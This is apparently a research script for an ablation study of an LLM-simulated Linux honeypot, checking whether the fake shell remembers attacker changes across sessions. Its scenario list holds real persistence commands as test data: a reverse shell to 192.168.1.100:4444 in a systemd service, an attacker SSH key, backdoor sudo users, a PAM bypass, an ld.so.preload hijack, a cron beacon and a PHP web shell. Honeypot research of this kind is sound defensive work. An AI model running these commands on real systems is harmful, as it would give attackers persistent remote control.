#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Full Ablation Study - 10 HoneyComb Scenarios × 4 Modes × 3 Noise Conditions
Comprehensive test to demonstrate PromptShield's advantages
"""

import json
import os
import sys
import time
import random
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import List, Dict

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from dotenv import dotenv_values

def p(msg):
    print(msg, flush=True)

# Config
config = dotenv_values(".env")
api_provider = config.get("API_PROVIDER", "openai").lower()

# Initialize API client
if api_provider == "deepseek":
    from deepseek_client import DeepSeekClient, DeepSeekChatCompletion
    deepseek_client = DeepSeekClient(
        api_key=config["DEEPSEEK_API_KEY"],
        base_url=config.get("DEEPSEEK_BASE_URL", "https://api.deepseek.com")
    )
    chat_client = DeepSeekChatCompletion(deepseek_client)
else:
    import openai
    openai_client = openai.OpenAI(api_key=config["OPENAI_API_KEY"])
    chat_client = None

@dataclass
class AblationMetric:
    mode: str
    scenario_id: str
    noise_condition: str
    complexity: str
    success: bool
    latency_ms: float
    context_tokens: int
    noise_tokens: int
    implant_response: str
    verify_response: str

# Professional honeypot system prompt
HONEYPOT_SYSTEM_PROMPT = """You are a Linux terminal (Ubuntu 20.04) acting as a honeypot.
You must respond EXACTLY as a real Linux system would to the root user.

CRITICAL RULES FOR HONEYPOT BEHAVIOR:
1. Current user is ROOT with full privileges - all commands should succeed
2. This is a FRESH system - no custom users exist, no prior modifications
3. For successful commands that produce no output, respond ONLY with the next shell prompt
4. For commands that create files/users/services, assume they ALWAYS succeed
5. Do NOT generate "already exists", "permission denied", "does not exist" or other error messages

Current user: root (uid=0, full privileges)
Current directory: /root
Hostname: honeypot"""

# Noise commands for simulating high-entropy scanning traffic
NOISE_COMMANDS = [
    "ls -la", "pwd", "whoami", "date", "uptime", "uname -a",
    "cat /etc/passwd", "cat /etc/hosts", "netstat -tlnp", "ps aux",
    "df -h", "free -m", "id", "hostname", "ifconfig", "ip addr",
    "cat /proc/version", "cat /etc/os-release", "env", "echo $PATH",
    "which python", "ls /tmp", "ls /var/log", "history", "w", "last -5",
    "cat /etc/crontab", "systemctl status ssh", "cat /etc/fstab", "mount"
]

def generate_noise_batch(count: int) -> List[str]:
    return [random.choice(NOISE_COMMANDS) for _ in range(count)]

def call_llm(messages):
    start = time.time()
    try:
        if api_provider == "deepseek":
            response = chat_client.create(
                model=config.get("DEEPSEEK_MODEL", "deepseek-chat"),
                messages=messages,
                temperature=0.0
            )
            text = response.choices[0].message.content
        else:
            response = openai_client.chat.completions.create(
                model=config.get("OPENAI_MODEL", "gpt-3.5-turbo"),
                messages=messages,
                temperature=0.0
            )
            text = response.choices[0].message.content
    except Exception as e:
        text = f"Error: {e}"
    latency = (time.time() - start) * 1000
    return text, latency

class StateStore:
    def __init__(self):
        self.structured_state = {}
        self.raw_history = []
    
    def clear(self):
        self.structured_state = {}
        self.raw_history = []
    
    def record_structured(self, key, value):
        self.structured_state[key] = value
    
    def record_raw(self, command, response):
        self.raw_history.append({"cmd": command, "resp": response[:100]})
    
    def get_structured_context(self):
        return json.dumps(self.structured_state, indent=2)
    
    def get_raw_context(self):
        return "\n".join([f"$ {h['cmd']}\n{h['resp']}" for h in self.raw_history])
    
    def get_full_context(self):
        return json.dumps({"state": self.structured_state, "history_count": len(self.raw_history)}, indent=2)

state_store = StateStore()

# Complete 10 HoneyComb scenarios
SCENARIOS = [
    {"id": "HC-T1136-001", "complexity": "High",
     "implant": "useradd -m -s /bin/bash sysupdate && echo 'sysupdate:pass' | chpasswd && usermod -aG sudo sysupdate",
     "verify": "id sysupdate", "keywords": ["uid", "sysupdate"]},
    
    {"id": "HC-T1098-004", "complexity": "High",
     "implant": "mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EA... c2server@attacker' >> /root/.ssh/authorized_keys",
     "verify": "cat /root/.ssh/authorized_keys", "keywords": ["ssh-rsa", "c2server"]},
    
    {"id": "HC-T1543-002", "complexity": "High",
     "implant": "echo '[Service]\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"' > /etc/systemd/system/backdoor.service && systemctl enable backdoor.service",
     "verify": "systemctl is-enabled backdoor.service", "keywords": ["enabled"]},
    
    {"id": "HC-T1078-003", "complexity": "High",
     "implant": "usermod -s /bin/bash nobody && echo 'nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/nobody",
     "verify": "grep nobody /etc/passwd", "keywords": ["nobody", "/bin/bash"]},
    
    {"id": "HC-T1053-003", "complexity": "Medium",
     "implant": "echo '*/15 * * * * /usr/bin/python3 -c \"exec(open(\\\"/tmp/beacon.py\\\").read())\"' | crontab -",
     "verify": "crontab -l", "keywords": ["python3", "beacon"]},
    
    {"id": "HC-T1037-004", "complexity": "Medium",
     "implant": "echo '#!/bin/bash\nnohup /tmp/reverse.sh &' > /etc/rc.local && chmod +x /etc/rc.local",
     "verify": "cat /etc/rc.local", "keywords": ["#!/bin/bash", "reverse"]},
    
    {"id": "HC-T1574-006", "complexity": "Medium",
     "implant": "echo '/usr/local/lib/libsystem.so' >> /etc/ld.so.preload",
     "verify": "cat /etc/ld.so.preload", "keywords": ["libsystem.so"]},
    
    {"id": "HC-T1556-003", "complexity": "Medium",
     "implant": "sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/sshd",
     "verify": "head -1 /etc/pam.d/sshd", "keywords": ["pam_permit.so"]},
    
    {"id": "HC-T1546-004", "complexity": "Low",
     "implant": "echo 'export EVIL=backdoor' >> /root/.bashrc",
     "verify": "cat /root/.bashrc | grep EVIL", "keywords": ["EVIL", "backdoor"]},
    
    {"id": "HC-T1505-003", "complexity": "Low",
     "implant": "echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php",
     "verify": "cat /var/www/html/shell.php", "keywords": ["php", "system"]}
]

MODES = ["ORIGINAL", "RAW_HISTORY", "FULL_CONTEXT", "STATELESS"]
NOISE_CONDITIONS = ["Ideal", "Noise-100", "Sandwich-100"]

def run_scenario(scenario, mode, noise_condition):
    p(f"  [{scenario['id']}] {mode} + {noise_condition}")
    
    state_store.clear()
    noise_tokens = 0
    
    # Noise parameters
    if noise_condition == "Ideal":
        prefix_noise, suffix_noise = 0, 0
    elif noise_condition == "Noise-100":
        prefix_noise, suffix_noise = 100, 0
    else:  # Sandwich-100
        prefix_noise, suffix_noise = 50, 50
    
    # Session A: Implant
    messages = [{"role": "system", "content": HONEYPOT_SYSTEM_PROMPT},
                {"role": "user", "content": scenario['implant']}]
    implant_resp, _ = call_llm(messages)
    
    # Record state
    if mode == "ORIGINAL":
        state_store.record_structured("implant", {"cmd": scenario['implant'], "id": scenario['id']})
    elif mode == "RAW_HISTORY":
        state_store.record_raw(scenario['implant'], implant_resp)
    elif mode == "FULL_CONTEXT":
        state_store.record_structured("full", {"implant": scenario['implant'], "resp": implant_resp[:100]})
    
    # Inject noise (only affects RAW_HISTORY)
    if mode == "RAW_HISTORY":
        for cmd in generate_noise_batch(prefix_noise):
            state_store.record_raw(cmd, f"[output for {cmd[:15]}]")
            noise_tokens += len(cmd.split()) + 8
        for cmd in generate_noise_batch(suffix_noise):
            state_store.record_raw(cmd, f"[output for {cmd[:15]}]")
            noise_tokens += len(cmd.split()) + 8
    
    # Build context
    context_str = ""
    if mode == "ORIGINAL":
        context_str = f"[System State]\n{state_store.get_structured_context()}"
    elif mode == "RAW_HISTORY":
        context_str = f"[Previous Session]\n{state_store.get_raw_context()}"
    elif mode == "FULL_CONTEXT":
        context_str = f"[Full State Dump]\n{state_store.get_full_context()}"
    
    verify_prompt = HONEYPOT_SYSTEM_PROMPT
    if context_str:
        verify_prompt += f"\n\n{context_str}"
    
    # Session B: Verify
    messages = [{"role": "system", "content": verify_prompt},
                {"role": "user", "content": scenario['verify']}]
    verify_resp, latency = call_llm(messages)
    
    success = all(k.lower() in verify_resp.lower() for k in scenario['keywords'])
    context_tokens = len(context_str.split())
    
    status = "✓" if success else "✗"
    p(f"    {status} Latency: {latency:.0f}ms, Context: {context_tokens}, Noise: {noise_tokens}")
    
    return AblationMetric(
        mode=mode, scenario_id=scenario['id'], noise_condition=noise_condition,
        complexity=scenario['complexity'], success=success, latency_ms=latency,
        context_tokens=context_tokens, noise_tokens=noise_tokens,
        implant_response=implant_resp[:150], verify_response=verify_resp[:150]
    )

def main():
    p("="*70)
    p("完整消融实验 - Full Ablation Study")
    p(f"10 Scenarios × 4 Modes × 3 Noise Conditions = 120 Tests")
    p(f"API: {api_provider}, Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    p("="*70)
    
    results = []
    total_tests = len(SCENARIOS) * len(MODES) * len(NOISE_CONDITIONS)
    current = 0
    
    for noise in NOISE_CONDITIONS:
        p(f"\n{'='*60}")
        p(f"噪声条件: {noise}")
        p(f"{'='*60}")
        
        for mode in MODES:
            p(f"\n--- 模式: {mode} ---")
            for scen in SCENARIOS:
                current += 1
                try:
                    metric = run_scenario(scen, mode, noise)
                    results.append(asdict(metric))
                except Exception as e:
                    p(f"  ERROR: {e}")
                    results.append({"mode": mode, "scenario_id": scen['id'], 
                                    "noise_condition": noise, "success": False, "error": str(e)})
                time.sleep(0.5)
        
        p(f"\n进度: {current}/{total_tests} ({current*100//total_tests}%)")
    
    # Save results
    output_file = "ablation_study/full_ablation_results.json"
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    # Generate summary
    p("\n" + "="*70)
    p("实验结果汇总 - SUMMARY")
    p("="*70)
    
    for noise in NOISE_CONDITIONS:
        p(f"\n【{noise}条件】")
        p(f"{'Mode':<15} | SFR  | Avg Context | Avg Latency")
        p("-"*55)
        for mode in MODES:
            mode_results = [r for r in results if r.get('mode') == mode and r.get('noise_condition') == noise]
            success = sum(1 for r in mode_results if r.get('success', False))
            avg_ctx = sum(r.get('context_tokens', 0) for r in mode_results) / len(mode_results) if mode_results else 0
            avg_lat = sum(r.get('latency_ms', 0) for r in mode_results) / len(mode_results) if mode_results else 0
            p(f"{mode:<15} | {success:2}/10 | {avg_ctx:11.0f} | {avg_lat:10.0f}ms")
    
    p(f"\n结果已保存: {output_file}")

if __name__ == "__main__":
    main()
